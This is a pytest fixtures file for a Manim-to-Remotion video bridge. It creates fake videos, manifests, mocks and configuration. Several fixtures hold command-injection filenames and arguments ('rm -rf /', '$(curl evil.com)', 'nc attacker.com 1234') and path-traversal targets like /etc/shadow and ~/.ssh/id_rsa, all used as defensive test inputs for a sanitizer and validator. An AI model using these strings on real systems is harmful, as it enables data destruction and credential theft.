"""
Pytest configuration and shared fixtures for Manim-Remotion Bridge tests
"""

import json
import logging
import os
import sys
from collections.abc import Generator
from pathlib import Path
from typing import Any, Dict
from unittest.mock import Mock

import pytest

# Add the project root to the Python path for imports
PROJECT_ROOT = Path(__file__).parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

from manim_bridge.bridge import ManimBridge

# Import the modules we're testing
from manim_bridge.core.config import BridgeConfig
from manim_bridge.core.constants import SUPPORTED_VIDEO_FORMATS
from manim_bridge.monitoring.metrics import PerformanceMonitor
from manim_bridge.processing.hash_calculator import HashCalculator
from manim_bridge.processing.video_processor import VideoInfo, VideoProcessor
from manim_bridge.security.command_sanitizer import CommandSanitizer
from manim_bridge.security.path_validator import PathValidator
from manim_bridge.storage.file_operations import AtomicFileOperations
from manim_bridge.storage.manifest_handler import ManifestHandler


@pytest.fixture(scope="session")
def project_root() -> Path:
    """Fixture providing the project root directory"""
    return PROJECT_ROOT


@pytest.fixture
def temp_workspace(tmp_path) -> Generator[Path, None, None]:
    """
    Create a temporary workspace with proper directory structure
    """
    workspace = tmp_path / "test_workspace"
    workspace.mkdir()

    # Create standard directories
    (workspace / "manim-output").mkdir()
    (workspace / "remotion-app" / "public" / "assets" / "manim").mkdir(parents=True)
    (workspace / "scripts").mkdir()

    yield workspace


@pytest.fixture
def mock_video_file(temp_workspace) -> Path:
    """
    Create a mock video file for testing
    """
    video_file = temp_workspace / "manim-output" / "test_scene.mp4"

    # Create a minimal valid video file (just some bytes)
    with open(video_file, "wb") as f:
        # Write a minimal MP4 header
        f.write(b"\x00\x00\x00\x20ftypmp42")  # Basic MP4 signature
        f.write(b"\x00" * 100)  # Padding to make it non-empty

    return video_file


@pytest.fixture
def mock_large_video_file(temp_workspace) -> Path:
    """
    Create a mock large video file for testing size limits
    """
    video_file = temp_workspace / "manim-output" / "large_scene.mp4"

    with open(video_file, "wb") as f:
        f.write(b"\x00\x00\x00\x20ftypmp42")  # Basic MP4 signature
        # Write 10MB of data to test size limits
        chunk = b"\x00" * 1024  # 1KB chunks
        for _ in range(10 * 1024):  # 10MB total
            f.write(chunk)

    return video_file


@pytest.fixture
def mock_manifest_data() -> Dict[str, Any]:
    """
    Mock manifest data for testing
    """
    return {
        "/path/to/video1.mp4": {
            "hash": "abc123def456",
            "target": "/assets/video1.mp4",
            "processed_at": "2024-01-01T12:00:00",
            "scene": "TestScene",
            "quality": "720p30",
            "size": 1024000,
        },
        "/path/to/video2.mp4": {
            "hash": "def456ghi789",
            "target": "/assets/video2.mp4",
            "processed_at": "2024-01-01T12:05:00",
            "scene": "AnotherScene",
            "quality": "1080p30",
            "size": 2048000,
        },
    }


@pytest.fixture
def mock_manifest_file(temp_workspace, mock_manifest_data) -> Path:
    """
    Create a mock manifest file with test data
    """
    manifest_file = temp_workspace / ".manim-bridge-manifest.json"

    with open(manifest_file, "w", encoding="utf-8") as f:
        json.dump(mock_manifest_data, f, indent=2)

    return manifest_file


@pytest.fixture
def corrupted_manifest_file(temp_workspace) -> Path:
    """
    Create a corrupted manifest file for error testing
    """
    manifest_file = temp_workspace / ".corrupted-manifest.json"

    with open(manifest_file, "w", encoding="utf-8") as f:
        f.write('{"invalid": json syntax}')  # Invalid JSON

    return manifest_file


@pytest.fixture
def path_validator(temp_workspace) -> PathValidator:
    """
    Create a PathValidator instance for testing
    """
    from manim_bridge_secure import PathValidator as SecurePathValidator

    allowed_dirs = {"manim-output", "remotion-app/public/assets"}
    return SecurePathValidator(str(temp_workspace), allowed_dirs)


@pytest.fixture
def command_sanitizer() -> CommandSanitizer:
    """
    Create a CommandSanitizer instance for testing
    """
    logger = logging.getLogger("test_sanitizer")
    logger.setLevel(logging.DEBUG)
    return CommandSanitizer(logger)


# SecureManimExecutor fixture removed - not part of new modular system


# SecureManimRenderHandler fixture removed - not part of new modular system


@pytest.fixture
def dangerous_filenames():
    """
    Collection of dangerous filenames for security testing
    """
    return [
        "../../../etc/passwd",
        "file; rm -rf /",
        "video.mp4 && curl evil.com",
        "$(cat /etc/passwd).mp4",
        "`wget malware.com`.mp4",
        "file|nc attacker.com 1234",
        "'; DROP TABLE users; --.mp4",
        "\x00malicious.mp4",
        "\\x41\\x41\\x41.mp4",
        "file\n\rwith\nnewlines.mp4",
        "~/../secret.mp4",
        "/etc/shadow.mp4",
        "CON.mp4",  # Windows reserved name
        "NUL.mp4",  # Windows reserved name
        "A" * 300 + ".mp4",  # Too long filename
    ]


@pytest.fixture
def dangerous_paths():
    """
    Collection of dangerous paths for security testing
    """
    return [
        "../../../etc/passwd",
        "~/secret_file",
        "/etc/shadow",
        "../../windows/system32",
        "\\..\\..\\windows\\system32",
        "/proc/self/mem",
        "/dev/kmem",
        "\\\\network\\share\\file",
        "/var/log/auth.log",
        "symlink_to_outside",
    ]


@pytest.fixture
def dangerous_commands():
    """
    Collection of dangerous command arguments for security testing
    """
    return [
        ["render", "scene.py", "Scene; rm -rf /"],
        ["render", "$(curl evil.com)", "Scene"],
        ["render", "`wget malware`", "Scene"],
        ["render", "scene.py", "Scene", "--output", "/etc/passwd"],
        ["render", "scene.py", "Scene|nc attacker.com"],
        ["render", "scene.py", "Scene", "&&", "curl", "evil.com"],
        ["--evil-flag", "malicious"],
        ["render", "scene.py", "Scene", "-q", "invalid_quality"],
    ]


@pytest.fixture
def safe_filenames():
    """
    Collection of safe filenames that should pass validation
    """
    return [
        "test_scene.mp4",
        "Scene_123.mp4",
        "my-video-file.mp4",
        "Animation_Final_v2.mp4",
        "math_scene_720p.mp4",
        "教育视频.mp4",  # Unicode characters
        "спецсимволы.mp4",  # Cyrillic
        "数学动画.mp4",  # Chinese
    ]


@pytest.fixture
def mock_subprocess_result():
    """
    Mock subprocess result for testing command execution
    """
    result = Mock()
    result.returncode = 0
    result.stdout = "Manim Community v0.17.3\nFile ready at '/output/video.mp4'"
    result.stderr = ""
    result.args = ["manim", "render", "scene.py", "TestScene"]
    return result


@pytest.fixture
def security_test_logger():
    """
    Logger configured for security testing
    """
    logger = logging.getLogger("security_test")
    logger.setLevel(logging.DEBUG)

    # Create string handler to capture log messages
    from io import StringIO

    log_capture = StringIO()
    handler = logging.StreamHandler(log_capture)
    formatter = logging.Formatter("%(levelname)s:%(name)s:%(message)s")
    handler.setFormatter(formatter)
    logger.addHandler(handler)

    # Store the capture object in the logger for access in tests
    logger._test_capture = log_capture

    return logger


# Pytest marks for categorizing tests
pytest_markers = {
    "security": pytest.mark.security,
    "unit": pytest.mark.unit,
    "integration": pytest.mark.integration,
    "slow": pytest.mark.slow,
    "network": pytest.mark.network,  # For tests that might need network access
}


@pytest.fixture(autouse=True)
def cleanup_logs(caplog):
    """
    Automatically cleanup logs after each test
    """
    caplog.clear()
    yield
    caplog.clear()


@pytest.fixture
def mock_file_system_event():
    """
    Mock file system event for testing file watchers
    """
    event = Mock()
    event.is_directory = False
    event.src_path = "/test/path/video.mp4"
    event.event_type = "created"
    return event


@pytest.fixture(scope="session", autouse=True)
def configure_test_environment():
    """
    Configure the test environment globally
    """
    # Set test environment variable
    os.environ["TESTING"] = "1"

    # Configure logging for tests
    logging.basicConfig(
        level=logging.DEBUG,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    )

    yield

    # Cleanup
    os.environ.pop("TESTING", None)


# Helper functions for tests
def create_test_video_file(path: Path, size_mb: int = 1) -> Path:
    """
    Helper function to create a test video file of specified size

    Args:
        path: Path where to create the file
        size_mb: Size of the file in MB

    Returns:
        Path to the created file
    """
    path.parent.mkdir(parents=True, exist_ok=True)

    with open(path, "wb") as f:
        # Write minimal MP4 header
        f.write(b"\x00\x00\x00\x20ftypmp42")

        # Fill with zeros to reach desired size
        chunk_size = 1024  # 1KB chunks
        total_chunks = size_mb * 1024

        for _ in range(total_chunks):
            f.write(b"\x00" * chunk_size)

    return path


def assert_security_error_logged(caplog, expected_message: str = None):
    """
    Helper function to assert that a security error was logged

    Args:
        caplog: pytest caplog fixture
        expected_message: Optional specific message to check for
    """
    security_logs = [
        record
        for record in caplog.records
        if record.levelno >= logging.WARNING and "security" in record.name.lower()
    ]

    assert len(security_logs) > 0, "No security warnings/errors were logged"

    if expected_message:
        messages = [record.message for record in security_logs]
        assert any(
            expected_message in msg for msg in messages
        ), f"Expected message '{expected_message}' not found in security logs: {messages}"


def create_malicious_symlink(workspace: Path, link_name: str, target: str) -> Path:
    """
    Helper function to create a malicious symlink for testing

    Args:
        workspace: Test workspace directory
        link_name: Name of the symlink to create
        target: Target path (can be outside workspace)

    Returns:
        Path to the created symlink
    """
    link_path = workspace / link_name
    link_path.symlink_to(target)
    return link_path


# =====================================================================================
# FIXTURES FOR MODULAR MANIM BRIDGE SYSTEM
# =====================================================================================


class TestVideoGenerator:
    """Generates test video files with various properties."""

    # Video file signatures for different formats
    VIDEO_SIGNATURES = {
        ".mp4": b"\x00\x00\x00\x18ftypmp42",
        ".mov": b"\x00\x00\x00\x14ftypqt  ",
        ".avi": b"RIFF\x00\x00\x00\x00AVI ",
        ".webm": b"\x1a\x45\xdf\xa3",
    }

    @staticmethod
    def create_fake_video(path: Path, size: int = 1024, format_ext: str = ".mp4") -> Path:
        """Create a fake video file with proper header."""
        path = Path(path)
        path.parent.mkdir(parents=True, exist_ok=True)

        # Get appropriate signature
        signature = TestVideoGenerator.VIDEO_SIGNATURES.get(
            format_ext, TestVideoGenerator.VIDEO_SIGNATURES[".mp4"]
        )

        # Create content
        content = signature + b"fake_video_content" * (size // 20)
        content = content[:size]  # Trim to exact size

        path.write_bytes(content)
        return path

    @staticmethod
    def create_invalid_video(path: Path, size: int = 1024) -> Path:
        """Create an invalid video file with wrong header."""
        path = Path(path)
        path.parent.mkdir(parents=True, exist_ok=True)

        # Invalid signature
        content = b"INVALID_HEADER" + b"fake_content" * (size // 20)
        content = content[:size]

        path.write_bytes(content)
        return path


# Configuration fixtures for new modular system
@pytest.fixture
def basic_bridge_config(temp_workspace) -> BridgeConfig:
    """Create a basic bridge configuration for testing."""
    return BridgeConfig(
        source_dir=temp_workspace / "manim-output",
        target_dir=temp_workspace / "remotion-app/public/assets/manim",
        manifest_file=temp_workspace / ".manim-bridge-manifest.json",
        enable_dev_logging=True,
        log_performance=True,
        scan_on_start=False,  # Disable for most tests
    )


@pytest.fixture
def dev_bridge_config(basic_bridge_config: BridgeConfig, temp_workspace: Path) -> BridgeConfig:
    """Create a development configuration with logging enabled."""
    basic_bridge_config.log_file = temp_workspace / "test-bridge.log"
    basic_bridge_config.enable_dev_logging = True
    basic_bridge_config.log_performance = True
    basic_bridge_config.log_level = "DEBUG"
    return basic_bridge_config


# Component fixtures
@pytest.fixture
def bridge_path_validator(temp_workspace: Path) -> PathValidator:
    """Create a PathValidator instance for the bridge."""
    allowed_dirs = [
        temp_workspace / "manim-output",
        temp_workspace / "remotion-app/public/assets/manim",
    ]
    return PathValidator(allowed_dirs, enable_logging=True)


@pytest.fixture
def bridge_manifest_handler(temp_workspace: Path) -> ManifestHandler:
    """Create a ManifestHandler instance."""
    manifest_path = temp_workspace / ".test-manifest.json"
    return ManifestHandler(manifest_path, enable_logging=True)


@pytest.fixture
def bridge_hash_calculator() -> HashCalculator:
    """Create a HashCalculator instance."""
    return HashCalculator(enable_logging=True)


@pytest.fixture
def bridge_video_processor(bridge_hash_calculator: HashCalculator) -> VideoProcessor:
    """Create a VideoProcessor instance."""
    return VideoProcessor(hash_calculator=bridge_hash_calculator, enable_logging=True)


@pytest.fixture
def bridge_file_operations() -> AtomicFileOperations:
    """Create an AtomicFileOperations instance."""
    return AtomicFileOperations(enable_logging=True)


@pytest.fixture
def bridge_performance_monitor() -> PerformanceMonitor:
    """Create a PerformanceMonitor instance."""
    return PerformanceMonitor(enabled=True)


@pytest.fixture
def manim_bridge(basic_bridge_config: BridgeConfig) -> ManimBridge:
    """Create a ManimBridge instance."""
    return ManimBridge(basic_bridge_config)


# Video file fixtures
@pytest.fixture
def sample_bridge_video(temp_workspace: Path) -> Path:
    """Create a sample video file for bridge testing."""
    quality_dir = temp_workspace / "manim-output" / "1080p60"
    quality_dir.mkdir(parents=True, exist_ok=True)
    video_path = quality_dir / "TestScene.mp4"
    return TestVideoGenerator.create_fake_video(video_path, size=2048)


@pytest.fixture
def multiple_bridge_videos(temp_workspace: Path) -> list[Path]:
    """Create multiple sample video files."""
    videos = []
    source_dir = temp_workspace / "manim-output"

    # Different qualities
    for quality in ["480p15", "720p30", "1080p60"]:
        quality_dir = source_dir / quality
        quality_dir.mkdir(parents=True, exist_ok=True)

        # Different scenes
        for scene in ["Scene1", "Scene2", "TestAnimation"]:
            video_path = quality_dir / f"{scene}.mp4"
            videos.append(
                TestVideoGenerator.create_fake_video(video_path, size=1024 + len(scene) * 100)
            )

    return videos


@pytest.fixture
def invalid_bridge_videos(temp_workspace: Path) -> list[Path]:
    """Create invalid video files for testing."""
    videos = []
    source_dir = temp_workspace / "manim-output"
    quality_dir = source_dir / "480p15"
    quality_dir.mkdir(parents=True, exist_ok=True)

    # Invalid signature
    videos.append(TestVideoGenerator.create_invalid_video(quality_dir / "invalid.mp4", size=1024))

    # Too small
    videos.append(TestVideoGenerator.create_fake_video(quality_dir / "too_small.mp4", size=100))

    # Wrong extension
    wrong_ext = quality_dir / "video.txt"
    wrong_ext.write_text("This is not a video file")
    videos.append(wrong_ext)

    return videos


# Mock fixtures
@pytest.fixture
def mock_ffmpeg():
    """Mock ffmpeg subprocess calls."""
    from unittest.mock import Mock, patch

    mock_result = Mock()
    mock_result.returncode = 0
    mock_result.stdout = json.dumps(
        {
            "format": {"duration": "10.5"},
            "streams": [
                {
                    "codec_type": "video",
                    "codec_name": "h264",
                    "width": 1920,
                    "height": 1080,
                }
            ],
        }
    )

    with patch("subprocess.run", return_value=mock_result) as mock:
        yield mock


@pytest.fixture
def sample_bridge_manifest_data() -> Dict[str, Any]:
    """Sample manifest data for bridge testing."""
    return {
        "video1.mp4": {
            "hash": "abc123",
            "target": "/path/to/target/video1.mp4",
            "processed_at": "2024-01-01T00:00:00",
            "scene": "Scene1",
            "quality": "1080p60",
            "size": 1024,
            "duration": 10.5,
            "codec": "h264",
        },
        "video2.mp4": {
            "hash": "def456",
            "target": "/path/to/target/video2.mp4",
            "processed_at": "2024-01-01T01:00:00",
            "scene": "Scene2",
            "quality": "720p30",
            "size": 2048,
            "duration": 15.0,
            "codec": "h264",
        },
    }


@pytest.fixture
def sample_bridge_video_info(temp_workspace: Path) -> VideoInfo:
    """Sample VideoInfo object for testing."""
    return VideoInfo(
        path=temp_workspace / "test/video.mp4",
        hash="test_hash_123",
        size=1024,
        scene_name="TestScene",
        quality="1080p60",
        duration=10.5,
        resolution=(1920, 1080),
        codec="h264",
    )


# Security testing fixtures
@pytest.fixture
def malicious_bridge_paths() -> list[str]:
    """List of malicious path attempts for security testing."""
    return [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/shadow",
        "~/.ssh/id_rsa",
        "/proc/self/environ",
        "\\\\server\\share\\file.txt",
        "%APPDATA%\\malicious.exe",
        "${HOME}/.bashrc",
        "file:///etc/passwd",
        "\\x00truncated",
        "very_long_path_" + "a" * 1000,
        "",  # Empty path
        " ",  # Space-only path
        "\n\r\t",  # Whitespace characters
        "path/with\x00null",  # Null bytes
        "unicode_path_🔥",  # Unicode characters
    ]


# Performance testing fixtures
@pytest.fixture
def large_bridge_video_set(temp_workspace: Path) -> list[Path]:
    """Create a large set of videos for performance testing."""
    videos = []
    source_dir = temp_workspace / "manim-output"

    for i in range(25):  # 25 videos for performance testing
        quality = ["480p15", "720p30", "1080p60"][i % 3]
        quality_dir = source_dir / quality
        quality_dir.mkdir(parents=True, exist_ok=True)

        video_path = quality_dir / f"video_{i:03d}.mp4"
        size = 1024 + (i * 100)  # Varying sizes
        videos.append(TestVideoGenerator.create_fake_video(video_path, size))

    return videos


# Utility functions for bridge tests
def assert_bridge_video_valid(path: Path) -> None:
    """Assert that a video file is valid."""
    assert path.exists(), f"Video file does not exist: {path}"
    assert path.stat().st_size > 0, f"Video file is empty: {path}"
    assert path.suffix.lower() in SUPPORTED_VIDEO_FORMATS, f"Unsupported format: {path.suffix}"


def assert_bridge_manifest_entry_valid(entry: Dict[str, Any]) -> None:
    """Assert that a manifest entry has all required fields."""
    required_fields = ["hash", "target", "processed_at", "scene", "quality", "size"]
    for field in required_fields:
        assert field in entry, f"Missing required field: {field}"

    assert isinstance(entry["size"], int), "Size must be an integer"
    assert entry["size"] > 0, "Size must be positive"
    assert entry["hash"], "Hash cannot be empty"
    assert entry["scene"], "Scene name cannot be empty"


def create_corrupted_bridge_manifest(path: Path) -> None:
    """Create a corrupted manifest file for testing recovery."""
    path.write_text('{"corrupted": json data without closing brace')


# Environment fixtures
@pytest.fixture
def clean_bridge_env():
    """Clean environment variables for testing."""
    env_vars = [
        "MANIM_BRIDGE_SOURCE",
        "MANIM_BRIDGE_TARGET",
        "MANIM_BRIDGE_MANIFEST",
        "MANIM_BRIDGE_DEV",
        "MANIM_BRIDGE_WORKERS",
    ]

    original_values = {}
    for var in env_vars:
        original_values[var] = os.environ.get(var)
        if var in os.environ:
            del os.environ[var]

    yield

    # Restore original values
    for var, value in original_values.items():
        if value is not None:
            os.environ[var] = value
        elif var in os.environ:
            del os.environ[var]


# Pytest configuration functions
def pytest_configure(config):
    """Configure pytest with custom markers."""
    markers = [
        "unit: Unit tests for individual components",
        "integration: Integration tests for component interactions",
        "security: Security-focused tests for attack prevention",
        "performance: Performance and benchmark tests",
        "e2e: End-to-end tests for complete pipeline",
        "slow: Tests that take a long time to run",
        "concurrent: Tests that test concurrent access scenarios",
        "requires_ffmpeg: Tests that require ffmpeg to be installed",
    ]

    for marker in markers:
        config.addinivalue_line("markers", marker)


def pytest_collection_modifyitems(config, items):
    """Modify collected test items."""
    # Skip ffmpeg tests if ffmpeg is not available
    try:
        import subprocess

        subprocess.run(["ffmpeg", "-version"], capture_output=True, timeout=5)
        ffmpeg_available = True
    except (subprocess.SubprocessError, FileNotFoundError, subprocess.TimeoutExpired):
        ffmpeg_available = False

    if not ffmpeg_available:
        skip_ffmpeg = pytest.mark.skip(reason="ffmpeg not available")
        for item in items:
            if "requires_ffmpeg" in item.keywords:
                item.add_marker(skip_ffmpeg)
